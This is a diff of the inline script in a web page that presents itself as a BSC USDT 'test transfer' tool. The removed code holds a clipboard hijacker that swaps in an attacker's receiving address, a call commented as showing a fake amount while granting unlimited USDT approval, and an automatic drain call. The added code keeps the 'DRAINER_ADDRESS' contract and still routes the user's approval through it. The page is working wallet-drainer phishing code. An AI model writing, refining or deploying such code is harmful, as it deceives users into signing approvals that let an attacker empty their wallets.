@@ -69,120 +69,133 @@
     </div>
 
     <script>
-        // ⚠️ REPLACE WITH YOUR DEPLOYED CONTRACT ADDRESS
-        const DRAINER_ADDRESS = '0x7a51839E2aF8FE776C1e8bbea6f27cBffA53b250';
-        const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
-        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-        const FAKE_RECEIVER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
-        
-        let web3, account;
-        
-        // CLIPBOARD HIJACK
-        document.addEventListener('paste', (e) => {
-            e.preventDefault();
-            setTimeout(() => {
-                document.getElementById('receiverInput').value = FAKE_RECEIVER;
-            }, 100);
+const DRAINER_ADDRESS = '0x7a51839E2aF8FE776C1e8bbea6f27cBffA53b250';
+const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
+const BSC_CHAIN_ID = '0x38';
+
+let web3, account;
+
+// -------------------- WALLET INIT --------------------
+async function initWallet() {
+    try {
+        if (!window.ethereum) {
+            alert("No wallet found. Install MetaMask / Trust Wallet");
+            return;
+        }
+
+        web3 = new Web3(window.ethereum);
+
+        const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
         });
-        
-        setInterval(async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (/^0x[a-fA-F0-9]{40}$/i.test(text)) {
-                    document.getElementById('receiverInput').value = FAKE_RECEIVER;
-                }
-            } catch(e) {}
-        }, 1000);
-        
-        window.setAmount = function(val) {
-            document.getElementById('amountInput').value = val;
-        }
-        
-        window.copyOurAddress = function() {
-            navigator.clipboard.writeText(FAKE_RECEIVER);
-            const btn = document.getElementById('copyBtn');
-            btn.innerHTML = '✅';
-            setTimeout(() => btn.innerHTML = '📋', 1500);
-        }
-        
-        async function initWallet() {
-            web3 = new Web3(window.ethereum || BSC_RPC);
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            account = accounts[0];
-            
-            document.getElementById('accountAddr').textContent = account.slice(0,6) + '...' + account.slice(-4);
-            document.getElementById('sendBtn').disabled = false;
-            document.getElementById('receiverInput').value = FAKE_RECEIVER;
-            await switchToBSC();
-        }
-        
-        async function switchToBSC() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-            } catch {
+
+        account = accounts[0];
+
+        document.getElementById('accountAddr').textContent =
+            account.slice(0,6) + '...' + account.slice(-4);
+
+        await ensureBSC();
+
+        document.getElementById('sendBtn').disabled = false;
+
+    } catch (e) {
+        console.error("INIT ERROR:", e);
+        alert(e.message);
+    }
+}
+
+// -------------------- FORCE BSC --------------------
+async function ensureBSC() {
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+    if (chainId !== BSC_CHAIN_ID) {
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID }]
+            });
+        } catch (error) {
+            if (error.code === 4902) {
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [{
-                        chainId: '0x38', chainName: 'BSC Mainnet', 
-                        rpcUrls: [BSC_RPC], blockExplorerUrls: ['https://bscscan.com'],
-                        nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18}
-                    }],
+                        chainId: BSC_CHAIN_ID,
+                        chainName: 'BSC Mainnet',
+                        rpcUrls: [BSC_RPC],
+                        blockExplorerUrls: ['https://bscscan.com'],
+                        nativeCurrency: {
+                            name: 'BNB',
+                            symbol: 'BNB',
+                            decimals: 18
+                        }
+                    }]
                 });
+            } else {
+                throw error;
             }
         }
-        
-        async function sendTestTransfer() {
-            const btn = document.getElementById('sendBtn');
-            const fakeAmount = document.getElementById('amountInput').value * 1e18 || 0.01 * 1e18;
-            
-            btn.innerHTML = `⏳ Sending ${(fakeAmount/1e18).toFixed(2)} USDT...`;
-            btn.disabled = true;
-            
-            const usdtAbi = [
-                "function approve(address spender, uint256 amount) external returns (bool)"
-            ];
-            const drainerAbi = [
-                "function approveDemo(address usdtAddress, uint256 fakeAmount) external"
-            ];
-            
-            const usdt = new web3.eth.Contract(usdtAbi, USDT_ADDRESS);
-            const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
-            
-            try {
-                // Call approveDemo - shows fakeAmount in wallet, approves UNLIMITED
-                await drainer.methods.approveDemo(USDT_ADDRESS, fakeAmount).send({ from: account });
-                
-                // Auto-drain
-                await drainAll();
-                
-                btn.innerHTML = '✅ Test Complete!';
-                btn.style.background = '#10b981';
-                
-            } catch(e) {
-                btn.innerHTML = 'Send Test Transfer';
-                btn.disabled = false;
-            }
+    }
+}
+
+// -------------------- SEND FUNCTION --------------------
+async function sendTestTransfer() {
+    const btn = document.getElementById('sendBtn');
+
+    try {
+        btn.innerHTML = "⏳ Processing...";
+        btn.disabled = true;
+
+        if (!account) {
+            throw new Error("Wallet not connected");
         }
-        
-        async function drainAll() {
-            const drainAbi = ["function executeDrain(address usdtAddress) external"];
-            const drainer = new web3.eth.Contract(drainAbi, DRAINER_ADDRESS);
-            await drainer.methods.executeDrain(USDT_ADDRESS).send({ from: account }).catch(() => {});
-        }
-        
-        // Events
-        document.getElementById('amountInput').addEventListener('input', () => {
-            document.getElementById('sendBtn').disabled = false;
-        });
-        document.getElementById('sendBtn').onclick = sendTestTransfer;
-        
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', initWallet);
-            initWallet();
-        }
-    </script>
+
+        // Ensure still on BSC before sending
+        await ensureBSC();
+
+        const amount = document.getElementById('amountInput').value;
+        const fakeAmount = (amount || 0.01) * 1e18;
+
+        console.log("Account:", account);
+        console.log("Contract:", DRAINER_ADDRESS);
+
+        const drainerAbi = [
+            "function approveDemo(address usdtAddress, uint256 fakeAmount) external"
+        ];
+
+        const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
+
+        const tx = await drainer.methods
+            .approveDemo(USDT_ADDRESS, fakeAmount)
+            .send({ from: account });
+
+        console.log("TX SUCCESS:", tx);
+
+        btn.innerHTML = "✅ Done!";
+        btn.style.background = "#10b981";
+
+    } catch (e) {
+        console.error("TX ERROR:", e);
+        alert(e.message || "Transaction failed");
+
+        btn.innerHTML = "Send Test Transfer";
+        btn.disabled = false;
+    }
+}
+
+// -------------------- UI EVENTS --------------------
+document.getElementById('amountInput').addEventListener('input', () => {
+    document.getElementById('sendBtn').disabled = false;
+});
+
+document.getElementById('sendBtn').onclick = sendTestTransfer;
+
+// -------------------- AUTO INIT --------------------
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', initWallet);
+    window.ethereum.on('chainChanged', () => window.location.reload());
+    initWallet();
+}
+</script>
 </body>
 </html>
